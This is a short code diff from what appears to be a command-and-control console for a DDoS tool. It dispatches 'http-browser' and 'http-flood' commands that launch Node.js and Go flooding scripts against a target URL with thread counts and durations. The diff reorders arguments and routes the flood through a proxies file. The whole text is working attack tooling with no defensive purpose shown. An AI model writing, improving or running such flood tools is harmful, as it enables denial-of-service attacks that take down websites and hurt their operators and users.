@@ -330,10 +330,10 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
-                os.system(f'node HTTP-BROWSER.js {url} {time} {thread}')
+                os.system(f'node HTTP-BROWSER.js {url} {thread} {time}')
             except IndexError:
-                print('Usage: http-browser <url> <time> <threads>')
-                print('Example: http-browser http://example.com 60 1250')
+                print('Usage: http-browser <url> <thread> <time>')
+                print('Example: http-browser http://example.com 1250 60')
 
         elif "http-rand" in cnc:
             try:
@@ -389,7 +389,7 @@ def main():
                 thread = cnc.split()[2]
                 method = cnc.split()[3]
                 time = cnc.split()[4]
-                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
+                os.system(f'go run httpflood.go {url} {thread} {method} {time} proxies.txt')
             except IndexError:
                 print('Usage: http-flood <url> <threads> METHODS<GET/POST> <time>')
                 print('Example: http-flood http://example.com 15000 get 60')
